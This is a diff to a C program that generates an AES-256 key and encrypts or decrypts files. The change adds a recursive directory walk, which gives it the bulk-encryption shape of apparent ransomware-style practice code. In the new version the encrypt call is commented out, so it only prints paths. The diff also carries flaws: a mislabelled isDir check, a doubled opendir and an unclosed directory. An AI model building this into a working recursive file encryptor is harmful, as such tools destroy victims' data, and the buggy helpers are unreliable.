@@ -6,6 +6,8 @@
 #include <openssl/err.h>
 #include <openssl/aes.h>
 #include <openssl/rand.h>
+#include <sys/types.h>
+#include <sys/stat.h>
 #include <unistd.h>
 
 #define BLOCK_SIZE 16 // AES uses 128-bit block size encryption
@@ -115,15 +117,42 @@ void decrypt(unsigned char *key, char *fileName) {
     rename(fileTemp, fileName); // Rename our temp to override the current file even if it wasn't deleted
 }
 
+int isDir(const char* fileName) {
+    struct stat path;
+    stat(fileName, &path);
+    return S_ISREG(path.st_mode);
+}
+
+void recursiveSearch(unsigned char *key, char *dirName) {
+    DIR *curr = opendir(dirName);
+    struct dirent *entry;
+
+    if (!(curr = opendir(dirName)))
+        return;
+
+    while((entry=readdir(curr))) {
+        char pathLocation[1024];
+        if (entry->d_type == DT_DIR) {
+            // Ignore . and .. files (linux testing)
+            if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) {
+                continue;
+            }
+            snprintf(pathLocation, sizeof(pathLocation), "%s/%s", dirName, entry->d_name);
+            printf("%s\n", pathLocation);
+            recursiveSearch(key, pathLocation);
+        } else {            
+            snprintf(pathLocation, sizeof(pathLocation), "%s/%s", dirName, entry->d_name);
+            printf("%s\n", pathLocation);
+            //decrypt(key, pathLocation);
+        }
+    }
+}
+
 int main (int argc, char *argv[]) {
     // Our cipher parameters
     int num_bytes = 32; // 256-bit key size
     unsigned char *key = malloc(num_bytes);
-    char fileName[256];
     FILE *f_key;
-    // Our directory structure
-    DIR *users;
-    struct dirent *entry;
 
     // Generate the key
     RAND_bytes(key, 32);
@@ -140,25 +169,9 @@ int main (int argc, char *argv[]) {
         fclose(f_key);
     }
     
-    char directory[] = "files/";
-    char *pathLocation = malloc(strlen(directory) + strlen(fileName) + 1);
-    users = opendir(directory);
-    while( (entry=readdir(users)) )
-    {
-        strcpy(fileName, entry->d_name);
-        strcpy(pathLocation, directory);
-        strcat(pathLocation, fileName);
-        if (!strcmp(fileName, ".") || !strcmp(fileName, "..")) {
-            continue;
-        } 
-        // Call the encryption function to encrypt the files
-        if (argc <= 1) {
-            encrypt(key, pathLocation);
-        } else {
-            decrypt(key, pathLocation);
-        }
-    }
-    closedir(users);    
+    char directory[] = "files";
+    recursiveSearch(key, directory);
+
     // We don't like our keys being stored in the memory
     free(key);
     return 0;
